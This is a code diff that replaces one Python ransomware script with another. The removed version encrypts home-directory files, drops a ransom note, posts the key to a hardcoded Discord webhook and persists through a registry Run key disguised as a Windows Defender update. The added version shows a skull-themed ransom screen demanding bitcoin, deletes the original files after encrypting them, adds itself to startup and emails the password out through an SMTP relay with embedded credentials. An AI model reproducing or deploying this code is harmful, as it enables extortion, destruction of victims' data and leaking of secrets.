@@ -1,130 +1,216 @@
 import os
-import uuid
-import time
-import base64
-import pathlib
-import requests
+import sys
 import subprocess
-import winreg
-from cryptography.fernet import Fernet
+from tkinter import filedialog, messagebox
+import tkinter as tk
+from tkinter import ttk
+from cryptography.fernet import Fernet, InvalidToken
+import secrets
+import ctypes
+import smtplib
+from email.message import EmailMessage
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
 
-# === CONFIGURATION ===
+class FileEncryptor:
+    def __init__(self, master):
+        self.master = master
+        self.master.title("File Encryptor")
+        self.master.geometry("1920x1080")  # Set initial size
+        self.incorrect_attempts = 0
+        self.max_attempts = 3
+        # Set the icon for the application (replace 'skull_icon.png' with your icon file)
+        icon_path = os.path.abspath('skull_icon.png')
+        if os.path.exists(icon_path):
+            self.master.iconphoto(True, tk.PhotoImage(file=icon_path))
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1396813335776989184/0kPctN_oSkU2rebRm7Zd_HRqkFOrVp3ZjaYe_zO89BaD4mW4TjYW3wSszlOybx0fRMJW"
-EXCLUDE_DIRS = [
-    "C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)", "C:\\Steam"
-]
-TARGET_EXTENSIONS = ['.exe', '.txt', '.jpg', '.jpeg', '.doc', '.pdf']
-RANSOM_NOTE_NAME = "ransomnote.txt"
+        # Set red background color
+        self.master.configure(bg="red")
 
-# === RANSOM PAYLOAD INITIALIZATION ===
+        # Define the directory to be encrypted
+        self.directory_to_encrypt = "/home/pc-3s/Downloads/encrypt/"  # Update with your directory path
 
-device_id = str(uuid.uuid4())
-key = Fernet.generate_key()
-fernet = Fernet(key)
+        # Specify the path to the password file
+        self.password_file_path = "/home/pc-3s/Downloads/python/password.txt"  # Update with your desired path
 
-# === UTILITY FUNCTIONS ===
+        # Generate and save a random password if the password file doesn't exist
+        if not os.path.exists(self.password_file_path):
+            random_password = self.generate_and_save_password()
 
-def is_safe_path(path):
-    path = os.path.abspath(path)
-    return not any(path.startswith(ex) for ex in EXCLUDE_DIRS)
+        # Read the random password from the file
+        with open(self.password_file_path, "r") as password_file:
+            random_password = password_file.read()
 
-def encrypt_file(filepath):
-    try:
-        with open(filepath, 'rb') as f:
-            data = f.read()
-        encrypted = fernet.encrypt(data)
-        with open(filepath, 'wb') as f:
-            f.write(encrypted)
-    except Exception:
-        pass
+        # Hardcoded password for demonstration purposes
+        self.hardcoded_password = random_password.encode()
+        self.key = Fernet.generate_key()
+        self.cipher = Fernet(self.key)
 
-def decrypt_file(filepath, fernet_obj):
-    try:
-        with open(filepath, 'rb') as f:
-            data = f.read()
-        decrypted = fernet_obj.decrypt(data)
-        with open(filepath, 'wb') as f:
-            f.write(decrypted)
-    except Exception:
-        pass
+        # Encrypt the files within the predefined directory
+        self.encrypt_directory()
 
-def encrypt_directory(start_path):
-    for root, _, files in os.walk(start_path):
-        if not is_safe_path(root):
-            continue
-        for file in files:
-            if any(file.lower().endswith(ext) for ext in TARGET_EXTENSIONS):
-                encrypt_file(os.path.join(root, file))
+        # Create a themed style for a more appealing design
+        self.style = ttk.Style()
+        self.style.theme_use("clam")  # You can try other themes like 'alt', 'vista', 'xpnative', etc.
 
-def decrypt_directory(start_path, fernet_obj):
-    for root, _, files in os.walk(start_path):
-        if not is_safe_path(root):
-            continue
-        for file in files:
-            if any(file.lower().endswith(ext) for ext in TARGET_EXTENSIONS):
-                decrypt_file(os.path.join(root, file), fernet_obj)
+        # Load and resize the skull icon
+        skull_icon = tk.PhotoImage(file="skull_icon.png")  # Replace with the path to your skull icon
+        skull_icon = skull_icon.subsample(5, 5)  # Adjust the subsample values to resize
+        skull_label = ttk.Label(master, image=skull_icon, background="red")
+        skull_label.image = skull_icon
+        skull_label.pack(pady=10)
 
-def drop_ransom_note(path):
-    ransom_msg = f"""
-Vaše soubory byly zašifrovány.
+        # Create and configure labels and entry widgets
+        ttk.Label(master, text="Enter password:", background="red", foreground="white").pack(pady=5)
+        self.password_entry = ttk.Entry(master, show="*")
+        self.password_entry.pack(pady=5)
 
-🆔 ID: {device_id}
+        # Create and configure buttons
+        decrypt_button = ttk.Button(master, text="Decrypt", command=self.decrypt_directory)
+        decrypt_button.pack(pady=10)
 
-1. Pošlete skin v hodnotě 100€ na Steam účet.
-2. Poté obdržíte dešifrovací klíč přes Discord.
-3. Klíč vložte do souboru 'key.txt' na ploše.
+        # Create and configure payment label
+        payment_label = ttk.Label(master, text="Pay 0.01235489 BTC to 'cheeth'", background="red", foreground="black", font=("Arial", 12, "bold"))
+        payment_label.pack(pady=10)
 
-Soubor bude automaticky ověřen a dojde k dešifrování.
-"""
-    with open(os.path.join(path, RANSOM_NOTE_NAME), 'w', encoding='utf-8') as f:
-        f.write(ransom_msg)
+        # Check if the script is running with administrative privileges
+        if self.is_admin():
+            self.add_to_startup()
 
-def send_key_to_discord(device_id, key):
-    data = {
-        "content": f"💀 NEW DEVICE INFECTED 💀\n🆔 ID: `{device_id}`\n🔑 Key: `{key.decode()}`"
-    }
-    try:
-        requests.post(WEBHOOK_URL, json=data)
-    except Exception:
-        pass
+        # Send the email with the password file
+        self.send_email()
 
-def add_to_startup(file_path=None, name="WindowsDefenderUpdate"):
-    if not file_path:
-        file_path = os.path.abspath(__file__)
-    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
-    try:
-        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(reg_key, name, 0, winreg.REG_SZ, file_path)
-        winreg.CloseKey(reg_key)
-    except Exception:
-        pass
+    def is_admin(self):
+        try:
+            # Check if the script is running on Windows
+            if os.name == 'nt':
+                # Check if the user has administrative privileges
+                return ctypes.windll.shell32.IsUserAnAdmin() != 0
+            else:
+                # Non-Windows systems may use a different method to check for administrative privileges
+                # You may need to customize this part based on the specifics of the system
+                # This is just a placeholder and may not work on all non-Windows systems
+                return os.getuid() == 0
+        except AttributeError:
+            return False  # 'ctypes' module does not have 'windll' attribute
 
-def watch_for_key_file(expected_key_bytes):
-    desktop = os.path.join(str(pathlib.Path.home()), "Desktop")
-    key_file = os.path.join(desktop, "key.txt")
-    while True:
-        if os.path.exists(key_file):
-            try:
-                with open(key_file, 'r') as f:
-                    entered_key = f.read().strip().encode()
-                if entered_key == expected_key_bytes:
-                    fernet_obj = Fernet(entered_key)
-                    decrypt_directory(str(pathlib.Path.home()), fernet_obj)
-                    break
-            except Exception:
-                pass
-        time.sleep(10)
+    def generate_and_save_password(self):
+        # Generate a strong random password
+        random_password = secrets.token_urlsafe(16)
 
-# === MAIN EXECUTION ===
+        # Save the password to the specified file
+        with open(self.password_file_path, "w") as password_file:
+            password_file.write(random_password)
 
-def main():
-    user_home = str(pathlib.Path.home())
-    encrypt_directory(user_home)
-    drop_ransom_note(user_home)
-    send_key_to_discord(device_id, key)
-    add_to_startup()
-    watch_for_key_file(key)
+        return random_password
 
-if name == "__main__":
-    main()
+    def encrypt_directory(self):
+        cipher_password = self.cipher.encrypt(self.hardcoded_password)
+
+        for filename in os.listdir(self.directory_to_encrypt):
+            file_path = os.path.join(self.directory_to_encrypt, filename)
+
+            if os.path.isfile(file_path):
+                with open(file_path, "rb") as file:
+                    data = file.read()
+                    encrypted_data = self.cipher.encrypt(data)
+
+                with open(file_path + ".enc", "wb") as encrypted_file:
+                    encrypted_file.write(cipher_password + encrypted_data)
+
+                # Remove the original unencrypted file
+                os.remove(file_path)
+
+        print(f"Directory '{self.directory_to_encrypt}' encrypted successfully.")
+
+    def decrypt_directory(self):
+        entered_password = self.password_entry.get().encode()
+
+        try:
+            # Check if the entered password matches the randomly generated password
+            if entered_password == self.hardcoded_password:
+                self.incorrect_attempts = 0
+                for filename in os.listdir(self.directory_to_encrypt):
+                    file_path = os.path.join(self.directory_to_encrypt, filename)
+
+                    if file_path.endswith(".enc") and os.path.isfile(file_path):
+                        with open(file_path, "rb") as encrypted_file:
+                            encrypted_data = encrypted_file.read()
+                            decrypted_data = self.cipher.decrypt(
+                                encrypted_data[len(self.cipher.encrypt(self.hardcoded_password)):])
+
+                        with open(file_path[:-4], "wb") as decrypted_file:
+                            decrypted_file.write(decrypted_data)
+
+                        # Remove the encrypted file
+                        os.remove(file_path)
+
+                print(f"Directory '{self.directory_to_encrypt}' decrypted successfully.")
+
+                # Display success message
+                messagebox.showinfo("Success", "Files decrypted successfully. Be aware next time!")
+            else:
+                self.incorrect_attempts += 1
+                # Display popup error message
+                messagebox.showerror("Error", "Incorrect password. Please try again.")
+                print("Incorrect password. Directory decryption failed.")
+                if self.incorrect_attempts >= self.max_attempts:
+                    # If max attempts reached, execute another Python code
+                    self.execute_another_code()
+        except InvalidToken:
+            print("Invalid token. Directory decryption failed. Check if the password is correct.")
+
+    def execute_another_code(self):
+        print("Max incorrect attempts reached. Executing another Python code.")
+        try:
+            subprocess.Popen([sys.executable, "closing.py"])
+        except Exception as e:
+            print(f"Failed to execute closing.py: {e}")
+
+    def add_to_startup(self):
+        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        script_path = os.path.abspath(sys.argv[0])
+
+        try:
+            # Open the registry key
+            hkey = ctypes.windll.winreg.OpenKey(ctypes.windll.winreg.HKEY_CURRENT_USER, key, 0,                                 
+                                                ctypes.windll.winreg.KEY_SET_VALUE)
+
+            # Set the registry value
+            ctypes.windll.winreg.SetValueEx(hkey, "FileEncryptor", 0, ctypes.windll.winreg.REG_SZ, script_path)
+
+            # Close the registry key
+            ctypes.windll.winreg.CloseKey(hkey)
+
+            print("Added to startup successfully.")
+        except Exception as e:
+            print(f"Error adding to startup: {e}")
+
+    def send_email(self):
+        print("Sending email with password file... please wait!")
+        msg = MIMEMultipart()
+        msg['Subject'] = 'Password File'
+        msg['From'] = 'lillisette.rose@gmail.com'
+        msg['To'] = 'lillisette.rose@gmail.com'
+
+        part = MIMEBase('application', "octet-stream")
+        part.set_payload(open(self.password_file_path, "rb").read())
+        encoders.encode_base64(part)
+        part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(self.password_file_path)}"')
+        msg.attach(part)
+
+        try:
+            server = smtplib.SMTP('smtp.mailersend.net', 2525)
+            server.starttls()
+            server.login('MS_ZUPkt3@test-68zxl27zd7e4j905.mlsender.net', 'mssp.CktsrzT.0r83ql3dnmvgzw1j.VaUd6Yq')  # Replace with actual password
+            server.send_message(msg)
+            server.quit()
+            print("Email sent successfully")
+        except smtplib.SMTPException as e:
+            print(f"Error sending email: {e}")
+
+if __name__ == "__main__":
+    root = tk.Tk()
+    app = FileEncryptor(root)
+    root.mainloop()
